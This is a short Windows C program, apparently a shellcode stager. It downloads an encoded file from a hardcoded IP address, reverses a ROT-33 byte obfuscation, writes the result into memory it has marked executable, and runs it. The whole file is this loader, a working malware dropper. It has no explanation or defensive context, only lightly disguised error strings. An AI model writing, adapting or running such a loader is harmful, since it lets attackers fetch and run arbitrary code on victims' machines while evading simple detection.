#include "Windows.h"
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

void rot_n(unsigned char *byte, int n);

int main() {
    const char *url = "http://198.58.127.74/encrypted.bin";
    int rotation_value = 33;
    HINTERNET hInternet = NULL, hConnect = NULL;
    unsigned char *foo_sc = NULL;
    void *exec = NULL;


    hInternet = InternetOpen("foo", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        fprintf(stderr, "Error0", GetLastError());
        goto cleanup;
    }


    hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        fprintf(stderr, "Error1", GetLastError());
        goto cleanup;
    }


    DWORD file_size = 0;
    DWORD bytes_read = 0;
    foo_sc = (unsigned char *)malloc(4096);
    if (foo_sc == NULL) {
        fprintf(stderr, "Error2");
        goto cleanup;
    }

    unsigned char *current_position = foo_sc;
    DWORD total_size = 0;

    while (InternetReadFile(hConnect, current_position, 4096, &bytes_read) && bytes_read > 0) {
        total_size += bytes_read;
        current_position += bytes_read;
        unsigned char *temp = (unsigned char *)realloc(foo_sc, total_size + 4096);
        if (temp == NULL) {
            fprintf(stderr, "Error3");
            goto cleanup;
        }
        foo_sc = temp;
    }
    if (total_size == 0) {
        fprintf(stderr, "Error4");
        goto cleanup;
    }


    exec = VirtualAlloc(NULL, total_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        fprintf(stderr, "Error5");
        goto cleanup;
    }


    for (DWORD i = 0; i < total_size; i++) {
        rot_n(&foo_sc[i], -rotation_value);  
    }
    memcpy(exec, foo_sc, total_size);

    getchar();

    ((void(*)())exec)();

cleanup:
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    if (foo_sc) free(foo_sc);
    if (exec) VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}

void rot_n(unsigned char *byte, int n) {
    *byte = (*byte + n + 256) % 256;
}
